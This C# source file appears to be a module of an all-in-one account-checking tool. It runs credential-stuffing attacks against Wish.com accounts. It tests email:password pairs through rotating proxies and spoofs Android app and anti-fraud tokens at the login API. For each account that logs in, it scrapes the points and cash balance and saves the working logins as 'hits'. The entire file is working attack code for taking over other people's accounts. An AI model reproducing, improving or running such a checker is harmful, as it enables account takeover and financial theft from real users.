using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;

namespace Wish
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("Cookie", "_xsrf=1;");
                        HttpResponse res = httpRequest.Post(new Uri($"https://www.wish.com/api/email-login?email={s[0]}&password={s[1]}&session_refresh=false&app_device_id=13dc8379-82b2-3b01-aeab-592a7c78ed38&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C193%2C194%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C207%2C209&_app_type=wish&_riskified_session_token=9cd23af4-f035-4fb2-809b-c0fede01d029&_threat_metrix_session_token=7625-6c870f21-b654-4d63-b79d-e607cd23f212&advertiser_id=caf72538-cf4c-4328-9c1c-a4f33e16d6d4&_version=4.36.1&app_device_model=SM-G930K"));
                        string strResponse = res.ToString();
                        if (strResponse.Contains("\"session_token\""))
                        {
                            string sweeper_session = Uri.UnescapeDataString(res.Cookies.GetCookies("https://www.wish.com")["sweeper_session"].Value.Replace("%22", ""));
                            string captures = "";

                            captures = WishGetPointsAndBalance(sweeper_session).Replace("\\u00a0", "").Replace("\\u010d", "").Replace("\\u20bd", "");

                          
                            if (captures == "")
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - WISH] " + s[0] + ":" + s[1] + " | Balance: ? - Points: ?", Color.Green);
                                }
                                Export.AsResult("/Wish_hits", s[0] + ":" + s[1] + " | Balance: ? - Points: ?");
                                return false;
                            }
                            else if (captures.Contains("0.00") || captures.Contains("0,00"))
                            {
                                ZeusAIO.mainmenu.frees++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[FREE - WISH] " + s[0] + ":" + s[1], Color.OrangeRed);
                                }
                                Export.AsResult("/Wish_frees", s[0] + ":" + s[1]);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - WISH] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Wish_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        }
                        else
                            {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }


        static string WishGetPointsAndBalance(string sweeper_session)
        {
            while (true)
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.AddHeader("Cookie", $"_xsrf=1; sweeper_session={sweeper_session};");

                        HttpResponse res = httpRequest.Post(new Uri($"https://www.wish.com/api/redeemable-rewards/get-rewards?get_dashboard_info=true&offset=0&count=20&reward_type=1&app_device_id=13dc8379-82b2-3b01-aeab-592a7c78ed38&_xsrf=1&_client=androidapp&_capabilities=2,3,4,6,7,9,11,12,13,15,21,24,25,28,35,37,39,40,43,46,47,49,50,51,52,53,55,57,58,60,61,64,65,67,68,70,71,74,76,77,78,80,82,83,85,86,90,93,94,95,96,100,101,102,103,106,108,109,110,111,153,114,115,117,118,122,123,124,125,126,128,129,132,133,134,135,138,139,146,147,148,149,150,152,154,155,156,157,159,160,161,162,163,164,165,166,171,172,173,174,175,176,177,180,181,182,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,209&_app_type=wish&_riskified_session_token=9cd23af4-f035-4fb2-809b-c0fede01d029&_threat_metrix_session_token=7625-6c870f21-b654-4d63-b79d-e607cd23f212&advertiser_id=caf72538-cf4c-4328-9c1c-a4f33e16d6d4&_version=4.36.1&app_device_model=SM-G930K"));
                        string strResponse = res.ToString();

                        string points = "";
                        string balance = "";

                        if (res.StatusCode == HttpStatusCode.OK)
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                            points = jsonObj["data"]["dashboard_info"]["available_points"].ToString();

                        }
                        else
                        {
                            continue;
                        }

                        while (true)
                        {
                            httpRequest.AddHeader("Cookie", $"_xsrf=1; sweeper_session={sweeper_session}");

                            HttpResponse res2 = httpRequest.Get(new Uri($"https://www.wish.com/cash"));
                            string strResponse2 = res2.ToString();

                            if (strResponse2.Contains("\"wish_cash_balance\""))
                            {
                                balance = Regex.Match(strResponse2, "\"wish_cash_balance\": \"(.*?)\"").Groups[1].Value;
                                return $"Balance: {balance} - Points: {points}";
                            }
                            else
                            {
                                continue;
                            }
                        }
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }

    }
}
